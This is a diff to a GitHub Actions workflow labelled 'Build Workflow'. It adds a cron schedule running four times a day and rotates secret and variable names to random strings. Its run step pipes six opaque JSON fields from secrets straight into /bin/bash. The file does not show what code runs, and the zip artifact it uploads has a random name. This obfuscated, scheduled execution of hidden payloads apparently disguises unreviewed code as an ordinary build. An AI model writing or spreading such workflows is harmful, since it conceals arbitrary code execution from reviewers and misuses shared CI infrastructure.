@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 3,9,15,21 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,16 +17,19 @@ jobs:
           fetch-depth: 1
       - name: Build and run
         env:
-          aqezq8: ${{ secrets.aqezq8 }}
+          j9628: ${{ secrets.j9628 }}
         run: |
-          printf '%s' "$aqezq8" | jq -r .nq3457 | /bin/bash
-          printf '%s' "$vf396" | jq -r .lqlew58054 | /bin/bash
-          echo $lzop17259 | jq -r .cl1 | /bin/bash
+          printf '%s' "$j9628" | jq -r .l8 | /bin/bash
+          printf '%s' "$yr72" | jq -r .kz9 | /bin/bash
+          echo $a509 | jq -r .gp1 | /bin/bash
+          printf '%s' "$gpai84133" | jq -r .y2 | /bin/bash
+          printf '%s' "$kqpfs8510" | jq -r .bwe470 | /bin/bash
+          printf '%s' "$bjmx8" | jq -r .kp1 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: w1fNtF2k
+          name: TQN9Qysl
           path: "*.zip"
           retention-days: 1
